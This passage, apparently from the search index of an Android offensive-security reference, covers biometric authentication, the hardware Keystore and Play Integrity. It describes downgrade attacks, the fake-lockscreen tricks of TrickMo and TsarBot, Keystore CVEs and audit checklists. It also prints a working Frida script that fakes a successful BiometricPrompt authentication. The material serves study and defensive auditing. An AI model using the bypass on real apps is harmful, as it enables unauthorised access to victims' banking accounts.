crossing via IPC</li> <li>Intent Hijacking -- exploiting exported components to access sandboxed data</li> <li>Dynamic Code Loading -- loading code that operates within or escapes the sandbox</li> <li>Pegasus -- state-sponsored malware using sandbox escape exploits</li> <li>Play Integrity -- device integrity verification from within the sandbox</li> </ul>"},{"location":"platform-abuse/biometric-auth/","title":"Biometric Authentication","text":"<p>Android's biometric authentication framework lets apps verify user identity through fingerprint, face, or iris recognition. The BiometricPrompt API (introduced in Android 9, API 28) provides a standardized system-managed authentication dialog. From an offensive perspective, biometric authentication is only as strong as its implementation -- and most apps implement it poorly. The gap between \"uses BiometricPrompt\" and \"cryptographically bound biometric authentication\" is where nearly every bypass lives.</p>"},{"location":"platform-abuse/biometric-auth/#biometricprompt-api","title":"BiometricPrompt API","text":"<p>BiometricPrompt replaced the fragmented landscape of <code>FingerprintManager</code> (API 23) and vendor-specific biometric APIs with a single, system-managed interface. The system controls the UI, the sensor interaction, and the result callback. Apps cannot customize the prompt appearance or intercept the biometric data.</p>"},{"location":"platform-abuse/biometric-auth/#authentication-flow","title":"Authentication Flow","text":"<pre><code>App calls BiometricPrompt.authenticate()\n    -&gt; System shows BiometricPrompt dialog\n        -&gt; User provides biometric\n            -&gt; Sensor validates against enrolled template\n                -&gt; System calls onAuthenticationSucceeded(result)\n                    -&gt; App receives AuthenticationResult\n                        -&gt; If CryptoObject was provided: key is unlocked\n                        -&gt; If no CryptoObject: app trusts the boolean result\n</code></pre>"},{"location":"platform-abuse/biometric-auth/#two-authentication-modes","title":"Two Authentication Modes","text":"Mode How It Works Security Level Without CryptoObject <code>authenticate(cancellationSignal, executor, callback)</code> -- app receives a boolean success/failure Weak -- result can be spoofed by hooking the callback With CryptoObject <code>authenticate(cryptoObject, cancellationSignal, executor, callback)</code> -- biometric unlocks a Keystore key for cryptographic operations Strong -- the key material is hardware-protected and only released after genuine biometric verification in TEE <p>The critical difference: without CryptoObject, the app is trusting a software callback that says \"authentication succeeded.\" With CryptoObject, the hardware Keystore enforces that a valid biometric was presented before releasing the key for use.</p>"},{"location":"platform-abuse/biometric-auth/#biometric-classes","title":"Biometric Classes","text":"<p>The Android Compatibility Definition Document (CDD) defines three biometric strength classes:</p> Class Name Spoofing Acceptance Rate Use Cases Class 3 Strong SAR &lt; 7% Keystore key release, CryptoObject binding, app authentication Class 2 Weak SAR &lt; 20% Lockscreen unlock, non-cryptographic app auth Class 1 Convenience SAR &gt;= 20% Not usable for any security-sensitive operation"},{"location":"platform-abuse/biometric-auth/#class-3-strong-requirements","title":"Class 3 (Strong) Requirements","text":"<ul> <li>Must resist presentation attacks (fake fingerprints, photos for face unlock) with &lt; 7% acceptance rate</li> <li>Must be tested by an independent lab against the Android Biometric Security Guidelines</li> <li>Can be used with <code>setAllowedAuthenticators(BIOMETRIC_STRONG)</code> to restrict apps to Class 3 only</li> <li>Required for CryptoObject-bound authentication</li> <li>Required for Keystore keys with <code>setUserAuthenticationRequired(true)</code> using biometric binding</li> </ul>"},{"location":"platform-abuse/biometric-auth/#class-2-weak-face-unlock","title":"Class 2 (Weak) Face Unlock","text":"<p>Most Android face unlock implementations are Class 2 (camera-based 2D face matching without IR depth sensing). This includes the majority of non-Pixel, non-Samsung flagship face unlock implementations. A printed photo or video of the device owner can bypass Class 2 face unlock on many devices.</p> <p>The Pixel 4 was one of the few Android devices with a Class 3 face unlock (using Soli radar + IR dot projector, similar to Apple Face ID). Google removed the hardware in subsequent Pixel models.</p>"},{"location":"platform-abuse/biometric-auth/#fingerprint-vs-face-security","title":"Fingerprint vs Face Security","text":"Property Fingerprint (capacitive/optical/ultrasonic) Face (2D camera) Face (3D structured light) Typical class Class 3 Class 2 Class 3 Spoofing difficulty Medium (requires physical mold or high-res print) Low (photo or video) High (requires 3D model) CryptoObject support Yes Only if Class 3 Yes Common bypass Lifted fingerprint on gelatin/silicone Photo of face No practical bypass known Darkness/mask operation Works in all conditions Fails in low light, varies with masks Works with IR illumination"},{"location":"platform-abuse/biometric-auth/#cryptoobject-binding","title":"CryptoObject Binding","text":"<p>CryptoObject is the mechanism that makes biometric authentication cryptographically meaningful. It wraps a <code>Cipher</code>, <code>Signature</code>, or <code>Mac</code> object backed by a hardware Keystore key.</p>"},{"location":"platform-abuse/biometric-auth/#secure-implementation","title":"Secure Implementation","text":"<pre><code>val keyGenerator = KeyGenerator.getInstance(\n    KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\"\n)\nkeyGenerator.init(\n    KeyGenParameterSpec.Builder(\"biometric_key\", KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        .setUserAuthenticationRequired(true)\n        .setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG)\n        .setInvalidatedByBiometricEnrollment(true)\n        .build()\n)\nkeyGenerator.generateKey()\n\nval cipher = Cipher.getInstance(\"AES/CBC/PKCS7Padding\")\nval key = KeyStore.getInstance(\"AndroidKeyStore\").apply { load(null) }.getKey(\"biometric_key\", null)\ncipher.init(Cipher.ENCRYPT_MODE, key)\n\nval cryptoObject = BiometricPrompt.CryptoObject(cipher)\nbiometricPrompt.authenticate(promptInfo, cryptoObject)\n</code></pre> <p>When configured this way, the AES key is locked inside the TEE/StrongBox until a Class 3 biometric is verified. The <code>setInvalidatedByBiometricEnrollment(true)</code> flag ensures the key is destroyed if new biometrics are enrolled, preventing an attacker from adding their own fingerprint and using the existing key.</p>"},{"location":"platform-abuse/biometric-auth/#why-most-apps-get-this-wrong","title":"Why Most Apps Get This Wrong","text":"<p>The majority of banking apps use BiometricPrompt without CryptoObject. They call <code>authenticate()</code> without passing a <code>CryptoObject</code>, receive the boolean success callback, and then proceed to release a stored token or credential. This pattern is vulnerable to Frida bypass because the security decision is made in software, not in hardware.</p> <p>SEC Consult's research on biometric bypass and OWASP's MASTG guidance both document this as the most common weakness in Android biometric implementations.</p>"},{"location":"platform-abuse/biometric-auth/#downgrade-attacks","title":"Downgrade Attacks","text":""},{"location":"platform-abuse/biometric-auth/#biometric-to-pinpattern","title":"Biometric to PIN/Pattern","text":"<p>BiometricPrompt allows fallback to device credential (PIN, pattern, password) through <code>setAllowedAuthenticators(BIOMETRIC_STRONG | DEVICE_CREDENTIAL)</code> or the deprecated <code>setDeviceCredentialAllowed(true)</code>. When this is configured:</p> <ul> <li>User is shown the biometric prompt with a \"Use PIN\" or \"Use password\" option</li> <li>If the user (or an attacker with device access) selects the fallback, authentication proceeds with the device credential instead of biometric</li> <li>The app receives the same success callback regardless of which method was used</li> </ul> <p>This is a design-level downgrade: a device PIN is typically 4-6 digits and can be shoulder-surfed or captured by malware. If the app accepts device credential as equivalent to biometric, the security of the authentication is reduced to the strength of the weakest allowed method.</p>"},{"location":"platform-abuse/biometric-auth/#exploiting-biometric-timeout","title":"Exploiting Biometric Timeout","text":"<p>Keystore keys with <code>setUserAuthenticationValidityDurationSeconds()</code> remain unlocked for a time window after authentication. During this window, any code running in the app's process can use the key without re-authentication. If the timeout is too long (e.g., 300 seconds), an attacker who gains code execution in the app's process (through a WebView vulnerability, deep link exploit, or library compromise) can use the key freely.</p>"},{"location":"platform-abuse/biometric-auth/#malware-techniques","title":"Malware Techniques","text":""},{"location":"platform-abuse/biometric-auth/#trickmo-fake-lockscreen","title":"TrickMo Fake Lockscreen","text":"<p>TrickMo banking trojan deploys a fake lockscreen that captures the device PIN or unlock pattern. Discovered in October 2024 by Zimperium across 40 new variants, the technique works as follows:</p> <ol> <li>TrickMo displays a full-screen HTML page hosted on an external server</li> <li>The HTML is styled to mimic the device's actual lockscreen (PIN pad or pattern grid)</li> <li>The page is rendered in full-screen mode, making it visually indistinguishable from the real lockscreen</li> <li>When the user enters their PIN or draws their pattern, the input is captured</li> <li>The captured credential is transmitted to a C2 PHP endpoint along with the device's Android ID</li> </ol> <p>The captured PIN/pattern enables the attackers to unlock the device remotely (or during physical access) to perform on-device fraud during off-hours. At least 13,000 victims were identified across Canada, UAE, Turkey, and Germany.</p> <p>This attack is not a biometric bypass -- it captures the device credential that biometric authentication falls back to. If a banking app accepts device credential as a biometric fallback, the TrickMo-captured PIN is sufficient to authenticate.</p>"},{"location":"platform-abuse/biometric-auth/#tsarbot-pattern-capture","title":"TsarBot Pattern Capture","text":"<p>TsarBot, discovered by Cyble in March 2025, implements a similar lockscreen capture with additional sophistication:</p> <ol> <li>TsarBot uses <code>LockTypeDetector</code> to determine the device's lock type via accessibility service</li> <li>It reads on-screen text and descriptions (\"PIN area\", \"Device password\", pattern grid elements) to identify whether the device uses PIN, password, or pattern</li> <li>On the first <code>USER_PRESENT</code> broadcast, TsarBot loads a fake lockscreen matched to the detected lock type</li> <li>Captured credentials are exfiltrated to the C2 server</li> </ol> <p>TsarBot targets 750+ banking, finance, and cryptocurrency applications, making the captured device credential useful for unlocking the device and potentially bypassing biometric fallback in hundreds of apps.</p>"},{"location":"platform-abuse/biometric-auth/#overlay-based-biometric-phishing","title":"Overlay-Based Biometric Phishing","text":"<p>Malware families using overlay attacks can display fake biometric prompts that look like the system BiometricPrompt dialog. Since BiometricPrompt's UI is controlled by the system and appears as a bottom sheet, an overlay that mimics this appearance can trick users into touching the real fingerprint sensor while a malicious overlay captures other inputs. This is a social engineering attack rather than a technical bypass -- the user genuinely authenticates with the system, but the malware has already stolen credentials through the overlay displayed before or after the biometric prompt.</p>"},{"location":"platform-abuse/biometric-auth/#frida-bypass-techniques","title":"Frida Bypass Techniques","text":""},{"location":"platform-abuse/biometric-auth/#universal-biometric-bypass-no-cryptoobject","title":"Universal Biometric Bypass (No CryptoObject)","text":"<p>When an app uses BiometricPrompt without CryptoObject, the authentication is a software check that Frida can trivially bypass:</p> <pre><code>Java.perform(function() {\n    var BiometricPrompt = Java.use(\"android.hardware.biometrics.BiometricPrompt\");\n    var CryptoObject = Java.use(\"android.hardware.biometrics.BiometricPrompt$CryptoObject\");\n    var AuthenticationResult = Java.use(\"android.hardware.biometrics.BiometricPrompt$AuthenticationResult\");\n\n    BiometricPrompt.authenticate.overload(\n        \"android.os.CancellationSignal\",\n        \"java.util.concurrent.Executor\",\n        \"android.hardware.biometrics.BiometricPrompt$AuthenticationCallback\"\n    ).implementation = function(cancel, executor, callback) {\n        console.log(\"[BYPASS] BiometricPrompt.authenticate() called without CryptoObject\");\n        var result = AuthenticationResult.$new(null);\n        callback.onAuthenticationSucceeded(result);\n    };\n});\n</code></pre> <p>This hooks the <code>authenticate</code> overload that takes no CryptoObject and directly invokes the success callback with a null CryptoObject. The app receives <code>onAuthenticationSucceeded</code> and proceeds as if the user provided a valid biometric.</p> <p>The Universal Android Biometric Bypass script on Frida CodeShare handles both the modern BiometricPrompt API and the legacy FingerprintManager API, resolving constructor arguments at runtime for compatibility across Android versions.</p>"},{"location":"platform-abuse/biometric-auth/#why-cryptoobject-prevents-this","title":"Why CryptoObject Prevents This","text":"<p>When <code>authenticate(cryptoObject, ...)</code> is used, the <code>AuthenticationResult</code> returned in <code>onAuthenticationSucceeded</code> contains an initialized <code>CryptoObject</code> whose underlying <code>Cipher</code> or <code>Signature</code> has been unlocked by the TEE. If the Frida script passes a null CryptoObject or a CryptoObject with an un-initialized cipher, the app's subsequent attempt to use the cipher for encryption/decryption will throw <code>IllegalStateException</code> or <code>KeyPermanentlyInvalidatedException</code>.</p> <p>The TEE enforces the biometric check -- no amount of Frida hooking in the Android framework can convince the hardware to release a key without a genuine biometric presentation. This is the fundamental difference between \"event-based\" and \"crypto-based\" biometric authentication.</p>"},{"location":"platform-abuse/biometric-auth/#bypassing-cryptoobject-bound-authentication","title":"Bypassing CryptoObject-Bound Authentication","text":"<p>CryptoObject-bound authentication is resistant to simple callback hooking but not invulnerable:</p> Attack Feasibility Requirement Hook the callback with null CryptoObject Does not work -- app crash or key error None Enroll attacker's fingerprint on device Works -- TEE accepts any enrolled biometric Physical access + device credential Exploit TEE vulnerability Theoretically works -- extract or use key without biometric TEE exploit (rare, high-value) Downgrade to device credential fallback Works if app allows <code>DEVICE_CREDENTIAL</code> Captured PIN/pattern Re-create key without biometric requirement Works if app doesn't validate key properties server-side Root + Frida Exploit authentication timeout Works during validity window Code execution in app process during window"},{"location":"platform-abuse/biometric-auth/#cve-2024-53835-cve-2024-53840","title":"CVE-2024-53835 / CVE-2024-53840","text":"<p>Patched in the December 2024 Pixel security bulletin, these vulnerabilities allowed \"possible biometric bypass due to an unusual root cause.\" While details are limited, these were lockscreen-level biometric bypasses on Pixel devices -- distinct from app-level BiometricPrompt bypasses. A rooted attacker could chain these with app-level weaknesses to bypass in-app biometric checks as well.</p>"},{"location":"platform-abuse/biometric-auth/#implementation-audit-checklist","title":"Implementation Audit Checklist","text":"<p>When analyzing an app's biometric implementation for weaknesses:</p> Check Vulnerable If CryptoObject usage <code>authenticate()</code> called without CryptoObject parameter Key auth binding <code>setUserAuthenticationRequired(true)</code> not set on Keystore key Biometric strength <code>setAllowedAuthenticators</code> includes <code>DEVICE_CREDENTIAL</code> or <code>BIOMETRIC_WEAK</code> Enrollment invalidation <code>setInvalidatedByBiometricEnrollment(false)</code> or not set Auth timeout <code>setUserAuthenticationValidityDurationSeconds</code> &gt; 0 (creates a bypass window) Server-side validation Server accepts authentication without verifying a cryptographic proof (signed challenge) Fallback mechanism App stores plaintext credentials that are released on biometric success Result handling App checks <code>result.getCryptoObject()</code> is non-null after success"},{"location":"platform-abuse/biometric-auth/#banking-app-patterns","title":"Banking App Patterns","text":""},{"location":"platform-abuse/biometric-auth/#common-architecture","title":"Common Architecture","text":"<p>Most banking apps implement biometric authentication in one of these patterns:</p> <p>Pattern 1 (Weak): Store encrypted token locally, decrypt on biometric success callback. The encryption key is in software or Keystore without biometric binding. Frida bypass works.</p> <p>Pattern 2 (Medium): Store encrypted token, use Keystore key with <code>setUserAuthenticationRequired(true)</code> but allow device credential fallback. CryptoObject-bound but downgradable to PIN.</p> <p>Pattern 3 (Strong): Store nothing locally. On biometric success, use CryptoObject to sign a server challenge with a hardware-backed key. Server validates the signature. No fallback to device credential. This is the only pattern resistant to all known bypass techniques (short of TEE exploitation or enrolled biometric compromise).</p> <p>Pattern 3 is rare. Most banking apps in the wild use Pattern 1 or Pattern 2, making them vulnerable to Frida bypass or PIN capture respectively. Guardsquare's research on hardware-backed key attestation documents how few apps actually verify attestation server-side.</p>"},{"location":"platform-abuse/biometric-auth/#cross-references","title":"Cross-References","text":"<ul> <li>Overlay Attacks can display fake biometric prompts to phish credentials before or after real authentication</li> <li>Keystore provides the hardware-backed keys that make CryptoObject binding meaningful</li> <li>TrickMo captures device PINs that are the fallback for biometric authentication</li> <li>Play Integrity uses hardware attestation (built on the same Keystore infrastructure) for device trust</li> </ul>"},{"location":"platform-abuse/keystore/","title":"Keystore","text":"<p>The Android Keystore system provides hardware-backed cryptographic key storage, binding keys to the device's Trusted Execution Environment (TEE) or StrongBox secure element. Keys stored in hardware cannot be extracted -- even with root access, the key material never leaves the secure processor. This makes the Keystore the foundation for device trust, app authentication, and DRM. For attackers, breaking or circumventing the Keystore means defeating the strongest security guarantee Android offers.</p>"},{"location":"platform-abuse/keystore/#architecture","title":"Architecture","text":"<p>The Keystore system spans multiple layers from the Android framework down to dedicated security hardware:</p> <pre><code>App (KeyStore API)\n    -&gt; Keystore2 Service (system_server)\n        -&gt; KeyMint HAL (vendor implementation)\n            -&gt; TEE / StrongBox Hardware\n</code></pre>"},{"location":"platform-abuse/keystore/#components","title":"Components","text":"Component Role <code>java.security.KeyStore</code> Android framework API for key generation, storage, and use Keystore2 System service managing key access, permissions, and user authentication binding KeyMint HAL Hardware abstraction layer defining the interface to secure hardware (replaced Keymaster HAL in Android 12) TEE (TrustZone) ARM TrustZone-based isolated execution environment on the main processor StrongBox Discrete secure element (separate chip) with its own CPU, RAM, and storage"},{"location":"platform-abuse/keystore/#keymaster-to-keymint-evolution","title":"KeyMaster to KeyMint Evolution","text":"HAL Android Version Key Features Keymaster 1.0 Android 6.0 Basic hardware-backed key operations Keymaster 2.0 Android 7.0 Key attestation support Keymaster 3.0 Android 8.0 HIDL interface Keymaster 4.0 Android 9.0 StrongBox support, ID attestation Keymaster 4.1 Android 10 Identity credential, early boot keys KeyMint 1.0 Android 12 AIDL interface, replaced Keymaster KeyMint 2.0 Android 13 Curve 25519 support KeyMint 3.0 Android 14 ECDH key agreement improvements"},{"location":"platform-abuse/keystore/#tee-vs-strongbox","title":"TEE vs StrongBox","text":"Property TEE (TrustZone) StrongBox Hardware Isolated execution on main application processor Discrete secure element (separate chip) CPU Shared with main processor (isolated world) Dedicated processor Performance Fast -- shares SoC resources Slow -- constrained hardware Tamper resistance Limited physical tamper protection Designed for physical tamper resistance, side-channel resistance Key algorithms Full suite (RSA, EC, AES, HMAC, 3DES) Limited (RSA 2048, EC P-256, AES-256, HMAC-SHA256) Availability All Android devices since Android 6.0 Pixel 3+, Samsung Galaxy S10+, select devices since Android 9.0 Attack surface Larger -- runs a full trusted OS (Trustonic Kinibi, Qualcomm QSEE, etc.) Smaller -- minimal firmware on dedicated hardware Common implementations Trustonic Kinibi (Samsung), Qualcomm QSEE, Huawei iTrustee Titan M (Google Pixel), Samsung eSE, NXP SE050 <p>For apps, the choice is explicit:</p> <pre><code>val keyGenParameterSpec = KeyGenParameterSpec.Builder(\"my_key\", PURPOSE_SIGN)\n    .setDigests(KeyProperties.DIGEST_SHA256)\n    .setIsStrongBoxBacked(true)\n    .build()\n</code></pre> <p>If StrongBox is unavailable, the call throws <code>StrongBoxUnavailableException</code>. Most apps fall back to TEE-backed keys.</p>"},{"location":"platform-abuse/keystore/#key-attestation","title":"Key Attestation","text":"<p>Key attestation proves that a key was generated inside secure hardware on a genuine Android device. The attestation produces a certificate chain that can be verified by a remote server.</p>"},{"location":"platform-abuse/keystore/#certificate-chain","title":"Certificate Chain","text":"<pre><code>Attestation Certificate (leaf)\n    -&gt; Intermediate CA (device-specific)\n        -&gt; Google Attestation Root Key\n</code></pre> <p>The leaf certificate contains an extension (OID <code>1.3.6.1.4.1.11129.2.1.17</code>) with structured attestation data including:</p> Field Meaning <code>attestationSecurityLevel</code> TEE or StrongBox (or Software for non-hardware keys) <code>keymasterSecurityLevel</code> Security level of the KeyMint implementation <code>attestationChallenge</code> Server-provided nonce to prevent replay <code>verifiedBootState</code> GREEN, YELLOW, ORANGE, or RED <code>deviceLocked</code> Whether bootloader is locked <code>osVersion</code> Android OS version <code>osPatchLevel</code> Security patch level"},{"location":"platform-abuse/keystore/#what-attestation-proves","title":"What Attestation Proves","text":"<p>Key attestation cryptographically proves:</p> <ol> <li>The key was generated inside TEE/StrongBox hardware (not in software)</li> <li>The key has specific properties (algorithm, purpose, user auth requirements)</li> <li>The device's verified boot state at the time of key generation</li> <li>The device runs a specific Android version and patch level</li> <li>The attestation certificate chains to the Google attestation root key</li> </ol>"},{"location":"platform-abuse/keystore/#what-attestation-does-not-prove","title":"What Attestation Does Not Prove","text":"<ul> <li>That the device is not rooted (a rooted device with locked bootloader and GREEN boot state passes attestation)</li> <li>That the app environment is unmodified (attestation is about the hardware and OS, not the app)</li> <li>That the device is malware-free</li> </ul>"},{"location":"platform-abuse/keystore/#verification","title":"Verification","text":"<p>A server verifying attestation must:</p> <ol> <li>Validate the entire certificate chain up to the Google root</li> <li>Check the certificate revocation status list for revoked intermediate keys</li> <li>Verify the attestation challenge matches the server-provided nonce</li> <li>Check that <code>attestationSecurityLevel</code> is <code>TrustedEnvironment</code> or <code>Strongbox</code></li> <li>Verify <code>verifiedBootState</code> is GREEN and <code>deviceLocked</code> is true</li> </ol> <p>If any check fails, the server should not trust the attestation. Play Integrity API builds on this same mechanism for broader device integrity verdicts.</p>"},{"location":"platform-abuse/keystore/#historic-vulnerabilities","title":"Historic Vulnerabilities","text":""},{"location":"platform-abuse/keystore/#samsung-trustzone-keymaster-cve-2021-25444-cve-2021-25490","title":"Samsung TrustZone Keymaster (CVE-2021-25444, CVE-2021-25490)","text":"<p>The most significant Keystore vulnerability to date was published by researchers at Tel Aviv University in February 2022, affecting approximately 100 million Samsung Galaxy devices.</p> <p>Samsung's Keymaster Trusted Application (TA) running in the Trustonic Kinibi TEE contained fundamental cryptographic flaws in how it wrapped (encrypted) key material:</p> <p>CVE-2021-25444 -- IV Reuse: Samsung's key blob encryption used AES-GCM but allowed the caller to specify the initialization vector (IV). By providing the same IV for different key operations, an attacker with privileged access could decrypt hardware-protected key blobs. This affected Galaxy S9, J3, J7, TabS4, A6 Plus, and A9S models.</p> <p>CVE-2021-25490 -- Downgrade Attack: Even after Samsung patched the IV reuse vulnerability on newer devices (S10, S20, S21), the researchers demonstrated a downgrade attack. The patched Keymaster TA still supported the old, vulnerable key blob format for backward compatibility. An attacker could force key operations to use the legacy format, then exploit the IV reuse vulnerability. Samsung patched this by removing support for the legacy blob format on devices originally shipped with Android 9.0 or later.</p> <p>The keybuster proof-of-concept tool demonstrates both attacks. The research fundamentally undermined the \"hardware-protected keys cannot be extracted\" guarantee for affected Samsung devices.</p>"},{"location":"platform-abuse/keystore/#qualcomm-qsee-key-extraction","title":"Qualcomm QSEE Key Extraction","text":"<p>Research by Gal Beniamini demonstrated that Qualcomm's QSEE (Qualcomm Secure Execution Environment) implementation tied key material to a device-specific hardware key (SHK) but made it accessible to software running inside the TEE. A vulnerability in the QSEE kernel or any Trusted Application could expose the KeyMaster keys, enabling off-device brute-force attacks against Android Full Disk Encryption.</p> <p>The core issue: rather than using a hardware-bound key that is inaccessible to all software (including TEE software), Qualcomm's implementation derived keys from a value readable by TEE code. Any TEE vulnerability became a key extraction vulnerability.</p>"},{"location":"platform-abuse/keystore/#trustonic-kinibi-ta-exploitation","title":"Trustonic Kinibi TA Exploitation","text":"<p>Synacktiv's research on Kinibi TEE revealed that Trustonic's TEE, despite its security objectives, lacked basic exploit mitigations in Trusted Applications:</p> <ul> <li>No stack canaries (stack buffer overflows are directly exploitable)</li> <li>No guard pages between global variables and stack (heap/stack confusion attacks possible)</li> <li>Globals and stack allocated from the same data segment</li> </ul> <p>These missing mitigations mean that a memory corruption vulnerability in any TA running on Kinibi (including Samsung's Keymaster TA) is significantly easier to exploit than equivalent vulnerabilities in modern userspace applications.</p>"},{"location":"platform-abuse/keystore/#quarkslab-samsung-boot-chain-research","title":"Quarkslab Samsung Boot Chain Research","text":"<p>Quarkslab's analysis of the Samsung Galaxy A series boot chain documented vulnerabilities in the chain of trust leading to the TEE. Compromising the boot chain before the TEE initializes can undermine all TEE-based security guarantees, including Keystore.</p>"},{"location":"platform-abuse/keystore/#device-binding-and-bootloader-unlock","title":"Device Binding and Bootloader Unlock","text":"<p>Hardware-backed keys are bound to the device's security state. When the bootloader is unlocked:</p> Key Property Behavior <code>setUserAuthenticationRequired(true)</code> Key remains usable if user authentication succeeds Key attestation <code>verifiedBootState</code> Reports ORANGE instead of GREEN Key attestation <code>deviceLocked</code> Reports false Existing keys Remain in hardware but attestation reflects new boot state Factory reset Destroys all Keystore keys (user data wipe on unlock) <p>Banking apps that verify attestation at every session will reject the device after bootloader unlock because the attestation certificate reports ORANGE boot state even though the keys themselves remain in hardware. This is a policy decision by the server, not a technical limitation of the key material.</p> <p>On Samsung devices, unlocking the bootloader trips the Knox e-fuse permanently. Even if the bootloader is re-locked, the Knox warranty bit remains tripped and Samsung Pay, Secure Folder, and other Knox-dependent features are permanently disabled.</p>"},{"location":"platform-abuse/keystore/#how-banking-apps-use-key-attestation","title":"How Banking Apps Use Key Attestation","text":"<p>Banking and financial apps use key attestation as a device trust signal during enrollment and at runtime:</p>"},{"location":"platform-abuse/keystore/#enrollment-flow","title":"Enrollment Flow","text":"<ol> <li>App generates an asymmetric key pair in hardware with <code>setAttestationChallenge(serverNonce)</code></li> <li>App sends the attestation certificate chain to the server</li> <li>Server validates the chain, checks boot state, confirms hardware-backed generation</li> <li>Server associates the public key with the user account</li> <li>Subsequent authentication requires signing a challenge with the hardware-backed private key</li> </ol>"},{"location":"platform-abuse/keystore/#runtime-verification","title":"Runtime Verification","text":"<p>Each authentication session:</p> <ol> <li>Server sends a fresh challenge</li> <li>App signs the challenge using the hardware-backed key (requires user biometric/PIN if <code>setUserAuthenticationRequired(true)</code>)</li> <li>Server verifies the signature with the stored public key</li> <li>Some apps re-attest the key periodically to detect boot state changes</li> </ol>"},{"location":"platform-abuse/keystore/#common-weaknesses","title":"Common Weaknesses","text":"Weakness Impact Software-backed key fallback If hardware attestation fails, some apps fall back to software keys that can be extracted with root No attestation verification App generates hardware key but never sends attestation chain to server for validation Challenge not bound to session Replay attacks possible if the attestation challenge is predictable or reused Certificate chain not fully validated Skipping revocation list check allows use of compromised device keys Boot state not checked Server accepts attestation from ORANGE (unlocked) devices Key not bound to biometric Key usable without user authentication, defeating the device-binding purpose"},{"location":"platform-abuse/keystore/#implications-for-forensics","title":"Implications for Forensics","text":"<p>Hardware-backed Keystore has direct implications for mobile forensics:</p> Scenario Forensic Impact Locked device, locked bootloader Keys in TEE/StrongBox cannot be extracted, encrypted data is inaccessible without user credentials Unlocked device, locked bootloader Keys usable through normal APIs but not extractable for offline analysis Unlocked bootloader Factory reset on unlock destroys keys; if keys were backed up before unlock, attestation state has changed TEE vulnerability Exploit may enable key extraction on affected chipsets/firmware versions StrongBox No known extraction technique -- physically separated hardware with tamper resistance <p>For forensic tool vendors (Cellebrite, GrayKey), TEE vulnerabilities are high-value targets. A working TEE exploit on a popular chipset enables extraction of encryption keys, biometric templates, and other hardware-protected secrets across all devices using that chipset.</p> <p>The distinction between TEE and StrongBox matters: StrongBox's physical separation and tamper resistance make it substantially harder to attack than TrustZone-based TEE implementations that share the SoC with the application processor.</p>"},{"location":"platform-abuse/keystore/#cross-references","title":"Cross-References","text":"<ul> <li>Play Integrity uses hardware key attestation as the foundation for device integrity verdicts</li> <li>Biometric Authentication binds biometric verification to Keystore keys through CryptoObject</li> <li>Verified Boot state is embedded in key attestation certificates</li> <li>SELinux policy controls which processes can access Keystore APIs</li> </ul>"},{"location":"platform-abuse/play-integrity/","title":"Play Integrity","text":"<p>Google's device attestation framework, replacing SafetyNet. Apps use it to verify the device has not been tampered with -- not rooted, not running a custom ROM, bootloader locked. Banking apps, streaming services, and payment apps rely on it to gate access. For attackers and security researchers, bypassing Play Integrity is a prerequisite for dynamic analysis on modified devices.</p>"},{"location":"platform-abuse/play-integrity/#evolution-from-safetynet","title":"Evolution from SafetyNet","text":""},{"location":"platform-abuse/play-integrity/#timeline","title":"Timeline","text":"Date Event 2014 SafetyNet Attestation API launched 2017 SafetyNet adds hardware attestation option via key attestation 2017 Magisk introduces MagiskHide to bypass SafetyNet 2020 Google enables hardware key attestation in SafetyNet 2021 topjohnwu deprecates MagiskHide, introduces Zygisk 2022 Play Integrity API announced as SafetyNet replacement 2022 kdrag0n's Universal SafetyNet Fix provides last major SafetyNet bypass 2023 Play Integrity Fix (PIF) module released by chiteroman 2023 Google begins enforcing Play Integrity for new apps October 2023 Google announces SafetyNet end-of-life by January 2025 2024 TrickyStore released for hardware attestation bypass April 2025 Hardware-backed key attestation returned by default for all developers May 2025 SafetyNet fully decommissioned, breaking apps that had not migrated May 2025 Google enforces \"device/strong\" integrity with hardware-backed signals"},{"location":"platform-abuse/play-integrity/#key-architectural-changes","title":"Key Architectural Changes","text":"<p>SafetyNet provided a binary pass/fail response (<code>ctsProfileMatch</code> and <code>basicIntegrity</code>). Play Integrity provides granular verdict levels with multiple signals. SafetyNet's software attestation was relatively easy to spoof; Play Integrity's hardware attestation ties verification to the device's Trusted Execution Environment (TEE).</p>"},{"location":"platform-abuse/play-integrity/#verdict-levels","title":"Verdict Levels","text":"<p>The Play Integrity API returns a <code>deviceRecognitionVerdict</code> containing one or more labels:</p> Verdict Meaning Hardware Required What Passes <code>MEETS_BASIC_INTEGRITY</code> Device runs a recognized Android build No Stock or some custom ROMs with locked bootloader <code>MEETS_DEVICE_INTEGRITY</code> Genuine Android build, locked bootloader, passes CTS No (software-based on Android &lt; 13) Unmodified stock ROM <code>MEETS_STRONG_INTEGRITY</code> Hardware-backed attestation, recent security patch Yes (TEE/StrongBox) Fully stock, patched, locked bootloader"},{"location":"platform-abuse/play-integrity/#additional-signals","title":"Additional Signals","text":"Signal Content <code>appRecognitionVerdict</code> Whether the calling app is the genuine Play-distributed version <code>accountDetails</code> Whether the device has a licensed Google Play account <code>environmentDetails</code> Whether other apps are running that could capture the screen <code>recentDeviceActivity</code> Rate of integrity token requests (detects token farming)"},{"location":"platform-abuse/play-integrity/#verdict-decision-matrix","title":"Verdict Decision Matrix","text":"Condition Basic Device Strong Stock ROM, locked bootloader, patched Pass Pass Pass Stock ROM, locked bootloader, outdated patch Pass Pass Fail Stock ROM, unlocked bootloader Pass Fail Fail Custom ROM (signed) Pass Fail Fail Custom ROM (unsigned) Fail Fail Fail Rooted device (Magisk + PIF) Pass Pass (software) Fail Rooted device (no hiding) Fail Fail Fail Emulator (standard) Fail Fail Fail"},{"location":"platform-abuse/play-integrity/#how-apps-use-it","title":"How Apps Use It","text":"<p>Banking and financial apps call the Play Integrity API during launch or before sensitive operations:</p> <pre><code>IntegrityManager manager = IntegrityManagerFactory.create(context);\nTask&lt;IntegrityTokenResponse&gt; task = manager.requestIntegrityToken(\n    IntegrityTokenRequest.builder()\n        .setNonce(generateNonce())\n        .build());\ntask.addOnSuccessListener(response -&gt; {\n    String token = response.token();\n    sendToBackendForVerification(token);\n});\n</code></pre> <p>The token is a signed JWT sent to the app's backend. The backend calls Google's Integrity API to decode the verdict. The app never sees the raw verdict locally, preventing client-side 